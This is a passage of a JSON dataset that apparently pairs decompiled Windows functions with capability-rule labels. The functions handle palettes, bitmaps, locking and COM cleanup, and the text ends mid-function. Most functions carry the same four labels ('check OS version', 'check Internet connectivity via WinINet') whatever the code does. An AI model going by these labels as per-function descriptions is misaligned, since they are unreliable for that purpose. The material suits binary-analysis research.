        "decompiled_code": "\nvoid fcn.00429d5c(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uVar5;\n    char cVar6;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(in_EAX + 0x30) != '\\0') {\n        return;\n    }\n    if (*(iVar1 + 0x10) != 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == 0) {\n        return;\n    }\n    if (*(iVar1 + 0x14) == *(iVar1 + 8)) {\n        fcn.004286c4();\n    }\n    iVar2 = fcn.00426210();\n    *(iVar1 + 0x10) = iVar2;\n    if (iVar2 != 0) {\n        return;\n    }\n    sub.user32.dll_GetDC(0);\n    uVar3 = fcn.00425b18();\n    if (*(iVar1 + 0x71) == '\\0') {\n        iVar2 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xc);\n        iVar4 = sub.gdi32.dll_GetDeviceCaps(uVar3, 0xe);\n        if (*(iVar1 + 0x2a) * *(iVar1 + 0x28) <= iVar2 * iVar4) {\n            cVar6 = '\\0';\n            goto code_r0x00429ded;\n        }\n    }\n    cVar6 = '\\x01';\ncode_r0x00429ded:\n    *(iVar1 + 0x71) = cVar6;\n    if (cVar6 != '\\0') {\n        uVar5 = sub.gdi32.dll_CreateHalftonePalette(uVar3);\n        *(iVar1 + 0x10) = uVar5;\n    }\n    sub.user32.dll_ReleaseDC(0, uVar3);\n    if (*(iVar1 + 0x10) == 0) {\n        *(in_EAX + 0x30) = 1;\n    }\n    return;\n}\n",
        "token_count": 471
    },
    "00429e14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429e14(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t in_ECX;\n    int16_t in_DX;\n    uint var_54h;\n    int32_t var_40h;\n    uint var_3ch;\n    \n    if ((in_DX != 2) || (in_ECX == 0)) {\n        fcn.004259e0();\n    }\n    fcn.00429c4c();\n    fcn.00403af4();\n    sub.gdi32.dll_GetObjectA();\n    if (var_40h == 0) {\n        var_3ch = 0;\n    }\n    fcn.0042957c(&var_54h);\n    *(in_EAX[10] + 0x70) = 0;\n    iVar1 = (**(*in_EAX + 0x24))();\n    *(in_EAX + 0x22) = iVar1 != 0;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 238
    },
    "00429ebc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00429ebc(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint in_ECX;\n    int32_t iVar3;\n    uint in_EDX;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x429ed8;\n    iVar1 = fcn.00404620();\n    puStack32 = 0x429f44;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(iVar1 + 8) = in_EDX;\n    *(iVar1 + 0x10) = in_ECX;\n    puVar4 = iVar1 + 0x18;\n    for (iVar3 = 0x15; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *arg_10h;\n        arg_10h = arg_10h + 1;\n        puVar4 = puVar4 + 1;\n    }\n    *(iVar1 + 0x70) = arg_ch;\n    if (*(iVar1 + 0x2c) != 0) {\n        *(iVar1 + 0x14) = *(iVar1 + 8);\n    }\n    uStack40 = 0x429f34;\n    puStack28 = &stack0xfffffffc;\n    uVar2 = fcn.00404800();\n    *(iVar1 + 0x6c) = uVar2;\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x499a18;\n    puStack32 = 0x429f65;\n    sub.kernel32.dll_EnterCriticalSection();\n    uStack36 = 0x429fa4;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00428938();\n    *(in_EAX + 0x28) = iVar1;\n    fcn.00428934();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x429fab;\n    uStack36 = 0x499a18;\n    uStack40 = 0x429fa3;\n    sub.kernel32.dll_LeaveCriticalSection();\n    return;\n}\n",
        "token_count": 568
    },
    "0042a930": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042a930(uint param_1, uint8_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack140;\n    uint uStack136;\n    uchar *puStack132;\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_15h;\n    int32_t var_9h;\n    int32_t *var_4h;\n    \n    uStack116 = 0x42a946;\n    var_4h = in_EAX;\n    uVar2 = fcn.00429a9c();\n    if (param_2 != uVar2) {\n        if (param_2 == 0) {\n            uStack116 = 0x42a964;\n            (**(*var_4h + 0x70))();\n        }\n        else {\n            if (param_2 != 8) {\n                uStack116 = 0x42a987;\n                fcn.00403af4();\n                iVar1 = var_4h[10];\n                puVar5 = iVar1 + 0x18;\n                puVar6 = &fcn.0042a930::var_5dh;\n                for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar6 = *puVar5;\n                    puVar5 = puVar5 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                var_9h._0_1_ = '\\0';\n                var_49h = 0;\n                var_45h = 0x28;\n                var_41h = var_59h;\n                var_3dh = var_55h;\n                var_39h._0_2_ = 1;\n                var_39h._2_2_ = *(param_2 + 0x491e4f);\n                unique0x00007a00 = *(iVar1 + 0x10);\n                if (param_2 == 2) {\n                    stack0xfffffff4 = *0x4999fc;\n                }\n                else if (param_2 == 3) {\n                    uStack116 = 0;\n                    uStack120 = 0x42a9f1;\n                    sub.user32.dll_GetDC();\n                    uStack120 = 0x42a9f6;\n                    uVar3 = fcn.00425b18();\n                    uStack124 = 0x42a9fe;\n                    uStack120 = uVar3;\n                    *NULL = sub.gdi32.dll_CreateHalftonePalette();\n                    var_9h._0_1_ = '\\x01';\n                    uStack128 = 0;\n                    puStack132 = 0x42aa0d;\n                    uStack124 = uVar3;\n                    sub.user32.dll_ReleaseDC();\n                }\n                else if (param_2 == 5) {\n                    var_35h = 3;\n                    var_1dh = 0xf800;\n                    var_19h = 0x7e0;\n                    var_15h = 0x1f;\n                }\n                uStack136 = 0x42aa7c;\n                iStack140 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff74;\n                puVar5 = &fcn.0042a930::var_5dh;\n                puStack132 = &stack0xfffffffc;\n                (**(*var_4h + 0x68))();\n                fcn.0042957c(puVar5);\n                *(var_4h + 0x22) = stack0xfffffff4 != 0;\n                *in_FS_OFFSET = puVar5;\n                uStack136 = 0x42aa83;\n                if (var_9h != '\\0') {\n                    iStack140 = stack0xfffffff4;\n                    sub.gdi32.dll_DeleteObject();\n                }\n                return;\n            }\n            uStack116 = 0x42a973;\n            fcn.004259e0();\n        }\n    }\n    return;\n}\n",
        "token_count": 1031
    },
    "0042aabc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042aabc(char param_1, int32_t *param_2)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iStackY1120;\n    uchar *puStackY1116;\n    char cVar5;\n    char cStack1080;\n    uchar auStack1054 [1038];\n    \n    fcn.00403af4();\n    puVar1 = *(*(in_EAX + 0x28) + 0x6c);\n    if (puVar1 == NULL) {\n        fcn.00429bd8();\n        iVar2 = *(in_EAX + 0x28);\n        if (*(iVar2 + 0x14) != 0) {\n            cVar5 = *(iVar2 + 0x50);\n            fcn.0042696c(*(iVar2 + 0x50));\n            if (*(iVar2 + 0x70) != '\\0') {\n                cStack1080 = '\\f';\n                if (*(iVar2 + 0x3e) < 9) {\n                    cStack1080 = (1 << (*(iVar2 + 0x3e) & 0x1f)) * '\\x03' + '\\f';\n                }\n            }\n            fcn.00403af4(cVar5 + cStack1080 + '\\x0e');\n            fcn.004299b0();\n            fcn.004257f0();\n            sub.gdi32.dll_SelectObject(*(*(in_EAX + 0x2c) + 4), *(iVar2 + 0x14));\n            fcn.00425b18();\n            sub.gdi32.dll_GetDIBColorTable(*(*(in_EAX + 0x2c) + 4), 0, 0x100);\n            iStackY1120 = *(*(in_EAX + 0x2c) + 4);\n            sub.gdi32.dll_SelectObject();\n            puVar3 = *(iVar2 + 0x50);\n            puStackY1116 = auStack1054;\n            if ((puVar3 != NULL) && (puVar3 < auStack1054)) {\n                puStackY1116 = puVar3;\n            }\n            if ((((*(iVar2 + 0x70) == '\\0') && (puStackY1116 == NULL)) && (*(iVar2 + 0x10) != 0)) &&\n               ((*(iVar2 + 0x71) == '\\0' && (puStackY1116 = fcn.004262b4(),  8 < *(iVar2 + 0x3e))))) {\n                iStackY1120 = iStackY1120 + puStackY1116 * 4;\n            }\n        }\n        if (param_1 != '\\0') {\n            fcn.0041b978();\n        }\n        if (iStackY1120 != 0) {\n            fcn.00428abc();\n            if (puStackY1116 != NULL) {\n                if ((*(iVar2 + 0x50) == NULL) || (*(iVar2 + 0x50) != puStackY1116)) {\n                    *(iVar2 + 0x50) = puStackY1116;\n                }\n                if (*(iVar2 + 0x70) != '\\0') {\n                    fcn.00425f90();\n                }\n            }\n            if (*(iVar2 + 0x70) == '\\0') {\n                fcn.0041b978();\n                fcn.0041b978();\n                if ((8 < *(iVar2 + 0x3e)) && ((*(iVar2 + 0x40) & 3) != 0)) {\n                    fcn.0041b978();\n                }\n            }\n            else {\n                fcn.0041b978();\n                fcn.0041b978();\n            }\n            fcn.0041b978();\n            fcn.0041b978();\n        }\n    }\n    else {\n        uVar4 = (***puVar1)();\n        if (param_1 != '\\0') {\n            fcn.0041b978(uVar4);\n        }\n        (****(*(in_EAX + 0x28) + 0x6c))();\n        (**(*param_2 + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 961
    },
    "0042b044": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042b044(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uStack32;\n    int16_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if ((*(iVar1 + 8) == 0) && (*(iVar1 + 0xc) != 0)) {\n        iVar2 = 0;\n        fcn.0041b734(0, 0);\n        uStack32 = 0x42b073;\n        fcn.0041b940();\n        if (iVar2 != 0) {\n            if (iVar2 == 1) {\n                uStack32 = 6;\n                fcn.00426564(iVar1 + 0x10, in_EAX + 0x2c);\n            }\n            else {\n                uStack32 = 0x42b0af;\n                fcn.00425a04();\n            }\n        }\n        *(iVar1 + 8) = uStack32;\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "0042b0bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042b0bc(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    iVar1 = *(in_EAX + 0x28);\n    if (*(iVar1 + 0xc) == 0) {\n        if (*(iVar1 + 8) == 0) {\n            puStack32 = 0x42b0df;\n            fcn.00425a04();\n        }\n        puStack32 = 0x42b0eb;\n        uVar2 = fcn.00404620();\n        uStack36 = 0x42b149;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        iVar3 = fcn.0042b008();\n        if (iVar3 == *0x499a14) {\n            fcn.00403af4();\n            fcn.0041b978();\n        }\n        else {\n            fcn.0042b008();\n            fcn.00426ab4();\n        }\n        *in_FS_OFFSET = uStack40;\n        *(iVar1 + 0xc) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "0042b6d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042b6d4(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint *var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x42b6ec;\n    fcn.0042b6bc();\n    uStack32 = 0x42b775;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    for (var_8h = *(in_EAX + 4); (var_8h != NULL && ((param_2 != var_8h[2] || (param_1 != var_8h[3]))));\n        var_8h = *var_8h) {\n    }\n    if (var_8h == NULL) {\n        puStack28 = &stack0xfffffffc;\n        puVar1 = fcn.00402f00();\n        *puVar1 = *(in_EAX + 4);\n        uVar2 = fcn.0042b788();\n        puVar1[1] = uVar2;\n        puVar1[2] = param_2;\n        puVar1[3] = param_1;\n        *(in_EAX + 4) = puVar1;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x42b77c;\n    uStack32 = 0x42b774;\n    fcn.0042b6c8();\n    return;\n}\n",
        "token_count": 377
    },
    "0042b908": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0042b908(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*0x499a58 != 0) {\n        uVar1 = fcn.00424230();\n        fcn.00424230(uVar1);\n        iVar2 = fcn.0042b6d4();\n        return *(iVar2 + 4);\n    }\n    return 0;\n}\n",
        "token_count": 93
    },
    "0042bbf8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042bbf8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    char in_DL;\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        puStack56 = 0x42bc15;\n        in_EAX = fcn.00404974();\n    }\n    uStack60 = 0x42bca2;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fcn.004055c8();\n    fcn.0040d2e8();\n    arg_8h_00 = 0;\n    fcn.00407550();\n    fcn.0040afac(arg_8h_00);\n    fcn.0040dc88(arg_8h);\n    *(in_EAX + 0xc) = arg_ch;\n    *in_FS_OFFSET = arg_8h;\n    uStack64 = 0x42bca9;\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 306
    },
    "0042c934": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042c934(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uchar auStack76 [4];\n    int32_t iStack72;\n    int32_t iStack64;\n    uint arg_8h_00;\n    uint arg_ch;\n    uint arg_10h;\n    uint arg_14h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x42c9f9;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if (in_EAX == -0x7ffdfff7) {\n        arg_14h = *(in_EDX + 0x1c);\n        puStack32 = &stack0xfffffffc;\n        fcn.004057d4();\n        arg_10h = 0;\n        fcn.004057d4();\n        arg_ch = 0;\n        arg_8h_00 = *(in_EDX + 0x10);\n        fcn.004057d4();\n        iStack64 = fcn.0042bccc(arg_8h_00, arg_ch, arg_10h, arg_14h);\n        if (arg_8h != '\\0') {\n            fcn.004061e4();\n        }\n    }\n    else {\n        arg_10h = 0;\n        iStack64 = fcn.0042bbf8(0, in_EAX);\n    }\n    if (in_ECX != 0) {\n        iStack72 = iStack64;\n        if (iStack64 == 0) {\n            iStack72 = fcn.00405470();\n        }\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n        (**0x495014)(0xeedfade, 1, 7, auStack76);\n        return;\n    }\n    fcn.00404ec4();\n    *in_FS_OFFSET = arg_10h;\n    uStack40 = 0x42ca00;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 539
    },
    "0042cc60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0042cc60(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x42ccd6;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x499a5c = *0x499a5c + 1;\n    if (*0x499a5c == 0) {\n        *0x499a60 = 1;\n        fcn.00404650();\n        **0x494bb8 = 0;\n        **0x49484c = 0;\n        **0x494b48 = 0;\n        if (*0x499a6c != '\\0') {\n            sub.ole32.dll_CoUninitialize();\n        }\n        fcn.004060f8();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 221
    },
    "0042df70": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042e04f)\n\nvoid __fastcall fcn.0042df70(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_19h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    uStack48 = 0x42e08d;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        puStack56 = 0x42dfae;\n        fcn.00405584();\n        puVar1 = puStack44;\n    }\n    puStack44 = puVar1;\n    if (-1 < *(*(in_EAX + 0x10) + 8) + -1) {\n        puStack56 = 0x42dfd9;\n        fcn.00419898();\n        puStack56 = 0x42dfe4;\n        fcn.00407024();\n        uStack60 = 0x42e05c;\n        uStack64 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffc0;\n        puStack56 = &stack0xfffffffc;\n        fcn.0040700c();\n        cVar2 = fcn.0040f954();\n        if (cVar2 != '\\0') {\n            (**(_pe_dos_header + 0x40))();\n            (**(_pe_dos_header + 0x44))();\n        }\n        iVar3 = (**(_pe_dos_header + 0x10))();\n        if (iVar3 < 1) {\n            *in_FS_OFFSET = uStack52;\n            return;\n        }\n        puStack56 = 0x42e03a;\n        fcn.00404f70();\n    }\n    *in_FS_OFFSET = uStack52;\n    puStack44 = 0x42e094;\n    uStack48 = 0x42e084;\n    fcn.0040700c();\n    uStack48 = 0x42e08c;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 569
    },
    "0042d79c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042d79c(int32_t param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY112;\n    uint uStackY108;\n    uchar *puStackY104;\n    uint uStackY100;\n    uint in_stack_ffffffa0;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t *var_1ch;\n    int32_t *var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack72 = 0x42da33;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    puVar1 = &stack0xfffffffc;\n    var_ch = param_2;\n    var_8h = in_EAX;\n    if (param_1 != 0) {\n        puStack80 = 0x42d7d4;\n        fcn.00405584();\n        puVar1 = puStack68;\n    }\n    puStack68 = puVar1;\n    if (0 < *(*(var_8h + 0x10) + 8)) {\n        puStack80 = 0x42d7f0;\n        var_20h = fcn.00404620();\n        uStack84 = 0x42da0e;\n        uStack88 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffa8;\n        iVar2 = *(*(var_8h + 0x10) + 8);\n        puStack80 = &stack0xfffffffc;\n        if (-1 < iVar2 + -1) {\n            var_10h = 0;\n            puStack80 = &stack0xfffffffc;\n            var_24h = iVar2;\n            do {\n                iVar2 = fcn.00419898();\n                iVar2 = (**(**(iVar2 + 4) + 0x10))();\n                if (0 < iVar2) {\n                    fcn.00419740();\n                }\n                var_10h = var_10h + 1;\n                var_24h = var_24h + -1;\n            } while (var_24h != 0);\n        }\n        if (*(var_20h + 8) == 0) {\n            var_2ch = fcn.004059dc();\n            var_28h._0_1_ = 6;\n            in_stack_ffffffa0 = 0;\n            uStackY100 = 0x42d87b;\n            fcn.0040dbf4(0, &fcn.0042d79c::var_2ch);\n            uStackY100 = 0x42d880;\n            fcn.00404ec4();\n        }\n        else {\n            if (*(var_20h + 8) != 1) {\n                var_18h = fcn.00404620();\n                uStackY100 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffff9c;\n                if (-1 < *(var_20h + 8) + -1) {\n                    var_10h = 0;\n                    var_24h = *(var_20h + 8);\n                    do {\n                        puStackY104 = 0x42d8e4;\n                        iVar2 = fcn.00419898();\n                        puStackY104 = 0x42d8f1;\n                        var_1ch = (**(**(iVar2 + 4) + 0x14))();\n                        if (var_1ch != NULL) {\n                            uStackY108 = 0x42d956;\n                            uStackY112 = *in_FS_OFFSET;\n                            *in_FS_OFFSET = &stack0xffffff90;\n                            puStackY104 = &stack0xfffffffc;\n                            iVar2 = (**(*var_1ch + 0x14))();\n                            if (-1 < iVar2 + -1) {\n                                var_14h = 0;\n                                do {\n                                    (**(*var_1ch + 0xc))();\n                                    (**(*var_18h + 0x3c))();\n                                    var_14h = var_14h + 1;\n                                    iVar2 = iVar2 + -1;\n                                } while (iVar2 != 0);\n                            }\n                            *in_FS_OFFSET = uStackY112;\n                            puStackY104 = 0x42d95d;\n                            uStackY108 = 0x42d955;\n                            fcn.00404650();\n                            return;\n                        }\n                        var_10h = var_10h + 1;\n                        var_24h = var_24h + -1;\n                    } while (var_24h != 0);\n                }\n                if (*(var_8h + 0xc) == 0) {\n                    puStackY104 = 0x42d9c1;\n                    iVar2 = (**(*var_18h + 0x18))();\n                    puStackY104 = 0x42d9d0;\n                    (**(*var_18h + 0xc))();\n                    puStackY104 = 0x42d9db;\n                    (**(**(iVar2 + 4) + 0x20))();\n                }\n                else {\n                    puStackY104 = 0x42d97d;\n                    (**(*var_18h + 0x90))();\n                    puStackY104 = 0x42d98b;\n                    iVar2 = (**(**(var_8h + 0xc) + 0xc))();\n                    if (-1 < iVar2) {\n                        puStackY104 = 0x42d99b;\n                        iVar2 = (**(*var_18h + 0x18))();\n                        puStackY104 = 0x42d9aa;\n                        (**(*var_18h + 0xc))();\n                        puStackY104 = 0x42d9b5;\n                        (**(**(iVar2 + 4) + 0x20))();\n                    }\n                }\n                *in_FS_OFFSET = uStackY100;\n                fcn.00404650();\n                return;\n            }\n            iVar2 = fcn.00419898();\n            (**(**(iVar2 + 4) + 0x20))();\n        }\n        *in_FS_OFFSET = in_stack_ffffffa0;\n        uStack88 = 0x42da15;\n        fcn.00404650();\n        return;\n    }\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x42da3a;\n    uStack72 = 0x42da2a;\n    fcn.00405530();\n    uStack72 = 0x42da32;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1608
    },
    "0042dad8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042dbf6)\n// WARNING: Removing unreachable block (ram,0x0042dc21)\n// WARNING: Removing unreachable block (ram,0x0042dc24)\n// WARNING: Removing unreachable block (ram,0x0042dc64)\n// WARNING: Removing unreachable block (ram,0x0042dc80)\n// WARNING: Removing unreachable block (ram,0x0042dc84)\n// WARNING: Removing unreachable block (ram,0x0042dcca)\n// WARNING: Removing unreachable block (ram,0x0042dc93)\n// WARNING: Removing unreachable block (ram,0x0042dcd7)\n\nvoid __fastcall fcn.0042dad8(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = &stack0xfffffffc;\n    uStack76 = 0x42dd51;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    var_1ch = 0;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.00405584();\n        puVar1 = puStack72;\n    }\n    puStack72 = puVar1;\n    iVar3 = *(*(in_EAX + 